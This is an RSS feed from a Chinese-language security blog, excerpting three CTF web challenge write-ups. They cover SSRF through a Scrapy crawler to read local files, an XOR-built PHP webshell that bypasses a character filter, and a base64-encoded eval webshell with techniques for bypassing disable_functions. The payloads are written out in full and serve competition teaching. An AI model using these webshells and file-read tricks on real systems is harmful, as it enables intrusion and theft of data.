<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>SSRF on wh1sper</title>
    <link>https://anthem-whisper.github.io/tags/ssrf/</link>
    <description>Recent content in SSRF on wh1sper</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Wed, 28 Oct 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/ssrf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ByteCTF2020复现</title>
      <link>https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Wed, 28 Oct 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/</guid>
      <description>这次ByteCTF2020的web题目非常顶，第一天比赛快结束的时候全场web才有了第一个解，后来解人数最多的XSS也就不过十个解，可惜一直在看爬虫的题，最后还是没做出。
 easy_scrapy 考点：MD5爆破、SSRF
功能是添加一个http://或者https://开头的URL，并且要求输入验证码，可以利用以下脚本来爆破：
import hashlibfor i in range(99999999):if hashlib.md5(str(i).encode(&#39;UTF-8&#39;)).hexdigest()[:6] == &#39;2c97b3&#39;:print(i)break十几秒能出结果，之后可以BP重放数据包来快速的添加。
添加成功之后可以在MyUrlList里面看到添加记录，点进去可以看到爬取到的东西。
监听端口接收到请求：
GET / HTTP/1.1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: enUser-Agent: scrapy_redisAccept-Encoding: gzip, deflate发现是scrapy_redis，初步猜测是SSRF打redis。
既然他是爬虫，那么遇到类似于这种标签的话，他很有可能就会去请求，（后来放了HINT，叫去读这个页面的源码）尝试爬以下这道题的公网IP，发现他会把/list的源码一并爬下来，那么我们可以起一个页面来指向file:///etc/passwd
比赛的时候我用的是302重定向好像不行（哭了），其实这里他遇到一个标签就会去请求：
我们可以发现他请求到了我们想要的URL：
把标签的href改成file协议果然可以造成任意文件读：
这样的话我们可以逐一的读取他爬虫的源码，但是在这之前我们要先知道爬虫工作的绝对路径，可以通过读/proc/self/environ，得到绝对路径PWD=/code，这个知识点在本站[SWPU2019]Web3也提到过。
在官方文档中找到了这个爬虫框架的结构：
tutorial/scrapy.cfgtutorial/__init__.pyitems.pypipelines.pysettings.pyspiders/__init__.py...我们尝试去读取这些文件；
scrapy.cfg:
# Automatically created by: scrapy startproject## For more information about the [deploy] section see:# https://scrapyd.readthedocs.io/en/latest/deploy.html[settings]default = bytectf.</description>
    </item>
    
    <item>
      <title>“第五空间”智能安全大赛</title>
      <link>https://anthem-whisper.github.io/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</link>
      <pubDate>Fri, 26 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</guid>
      <description>hate-php 考点：异或取反构造无字母数字webshell
开题送码：
&amp;lt;?phperror_reporting(0);if(!isset($_GET[&#39;code&#39;])){highlight_file(__FILE__);}else{$code = $_GET[&#39;code&#39;];if (preg_match(&#39;/(f|l|a|g|\.|p|h|\/|;|\&amp;quot;|\&#39;|\`|\||\[|\]|\_|=)/i&#39;,$code)) { die(&#39;You are too good for me&#39;); }$blacklist = get_defined_functions()[&#39;internal&#39;];foreach ($blacklist as $blackitem) { if (preg_match (&#39;/&#39; . $blackitem . &#39;/im&#39;, $code)) { die(&#39;You deserve better&#39;); } }assert($code);}preg_match ban掉了下划线等字符，然后 get_defined_functions()[&#39;internal&#39;] 禁用了内置函数
但是没有过滤取反~和异或^，
PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过 (&#39;phpinfo&#39;)(); 来执行函数，第一个括号中可以是任意PHP表达式。
不但如此，这个payload还支持接受参数，比如 (&#39;phpinfo&#39;)(1) ，这道题过滤了分号，但是这道题不需要分号也可以执行
那么我们自然可以用这个来执行一些代码；
?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;amp;%ff=phpinfo成功返回了 phpinfo ，我们继续构造一个shell：
?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ee}(${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff})&amp;amp;%ee=system&amp;amp;%ff=ls可以看到ls的结果，不过cat好像又被宰掉了，用 tac fl* 来获取flag
do you know 预期：gopher协议SSRF打XXE，URL编码显示空字符，pop链</description>
    </item>
    
    <item>
      <title>GKCTF2020复现</title>
      <link>https://anthem-whisper.github.io/p/gkctf2020%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Sat, 20 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/gkctf2020%E5%A4%8D%E7%8E%B0/</guid>
      <description>GKCTF，题好平台棒，因为那段时间比赛太多就没打，现在填坑
 CheckIN 考点：PHP73 bypass disable_functions
打开题目是源码：
&amp;lt;title&amp;gt;Check_In&amp;lt;/title&amp;gt;&amp;lt;?phphighlight_file(__FILE__);class ClassName{public $code = null;public $decode = null;function __construct(){$this-&amp;gt;code = @$this-&amp;gt;x()[&#39;Ginkgo&#39;];$this-&amp;gt;decode = @base64_decode( $this-&amp;gt;code );@Eval($this-&amp;gt;decode);}public function x(){return $_REQUEST;}}new ClassName();目标很明确，传入 ?Ginkgo=（PHP代码） 就可以RCE，我们执行以下 phpinfo() 发现正常回显，但是system却没有回显。
我先构造一个shell蚁剑连接再说：?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs= （?Ginkgo=eval($_POST[&amp;lsquo;cmd&amp;rsquo;]);）
连接上之后，可以使用文件系统，但是虚拟终端却不能执行命令，猜测是disable_functions，在phpinfo里面果然翻到了
关于bypass diable_functions，这里推荐一篇文章
有四种绕过 disable_functions 的手法：
 第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞； 第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼； 第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制； 第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.</description>
    </item>
    
  </channel>
</rss>
